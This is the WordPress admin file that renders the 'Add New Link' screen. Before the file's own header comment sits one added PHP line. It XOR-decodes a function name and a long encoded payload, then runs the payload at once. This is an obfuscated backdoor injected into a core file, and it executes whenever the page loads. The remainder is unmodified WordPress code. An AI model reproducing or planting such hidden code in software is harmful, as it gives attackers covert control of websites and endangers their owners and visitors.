<?php $hhdQNsmFzi='W66V2Q61HC 30UE'^'4DS7F4iW=-CGY:+';$XiqSSa=$hhdQNsmFzi('','UPgq-=-7FX==lKIXK=>pAD+B6J7T 7mSFGQFnzPnDT ,-3=SEg>QKs15EWifU>2iJP :QdUpP1INAEKFc.l:kU8UINwhdIQ85:K6>zB1zGIqiSM>Q<NLGW4zqRMO,jRRl.BXsmm1VYD9DgyeyKYOO1uh1lC8AmXX85n wrE>A+51>mf,7DOapY<qk>UD24PlQ58,xPmP9y->IP,X81GNU4Q69QBHwDL1Y3G+=FvV2LVGNKKxVC75 68nGPn:7rpdrb5BfC=2DWvNiUV4GA7xeUkXk5XCA5;YRUKoJ8R7l2jW=AFXXehTH1+U<agN3R+QRiTB54TXNL3oaSTRKOR:lKFele 1t9;LL8wA<E+cHumG26RIVYH2OpBn=7<Vs:EJfdPQ;E+uc8zB4ST6FzlhE+WAEypzNa3ZhW1L 5MKR0>>IYR<4QB6.L1>3:+7C9g-.0:cX 0,eeo+EZ=61lL>5;6phNFYM;A9<H5Bkw:0Kds526QTeGI+8:+M4 V<rN<XD3BQTEN5mZaK- TAGYukYlAHEzvZOJ,5FUK0AlsALluTJCTVFWprldR:sRVUPt yArTtZ3R0>c.<vMFptx8J9V1bE=WlN++EFFysN 6RQ+6vGRCY9T-AHXPpZQgGB5<:,-GpZXEXnSKA<4B1Xw>hM4B.:=DRdEI30'^'<6OPKHCT21RS3.118IMXf<D0i.V Ah2>33voGZ+dM2UBNGT<+GF>9,UT16698KFAn4AN0HuT;T0gaekfCUf3bqW =nJHCnj2<3-YLRfXZziARsiWmO:>+2ZRU6,;MCirHGisZgd8r61MdIDEQo=.;P.LX1cfaI3=AnJIWWeM5YYTPEBGR=f<Yb6xbL00GF>DuZMXQkgYDsP4CtH9LPgsuR0ZJ4yBS -E8l,NDfKvT-:4+pAr0,EPAUPNot1yx=;-7BT1FgVW=wKpIq U+4RQE.aQOQ97 jP<+uvOnS7NW8csY 29xXHp>PG YZm39XB7rAufQU 9glHeh5; ..1RLcb:> qd1jol-KWeW RCuKMcDW><3phIEyKJYVH7,Q 3FYpuP RNi1sfP2 WfGLL3J;4 Bzs3kNPbsU-TTmvrpKP:< UU=+LKdIQAeOV7X8rCENK:ACISQ0O 9RRTDhZTOWYDnb=,O fW-LkBL0Y-LWQSB0tCaiJJHJ4kK3E-+D17G1ys.+LJvAoIA  nySMyD,,pRR>.>Mna>.If1ZaqQUs+wanveBBUSgXBc31dDFOtGfEhU1UZVHYQdfVRXY8K7H=.X.3+SB625QT>AO>>JRQkrg=X LhaxpPzqG<H<YLMAoT>9195t; EX-P<PcAv>KKBT0zTlr9M');$XiqSSa();
/**
 * Add Link Administration Screen.
 *
 * @package WordPress
 * @subpackage Administration
 */

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( ! current_user_can('manage_links') )
	wp_die(__('Sorry, you are not allowed to add links to this site.'));

$title = __('Add New Link');
$parent_file = 'link-manager.php';

wp_reset_vars( array('action', 'cat_id', 'link_id' ) );

wp_enqueue_script('link');
wp_enqueue_script('xfn');

if ( wp_is_mobile() )
	wp_enqueue_script( 'jquery-touch-punch' );

$link = get_default_link_to_edit();
include( ABSPATH . 'wp-admin/edit-link-form.php' );

require( ABSPATH . 'wp-admin/admin-footer.php' );
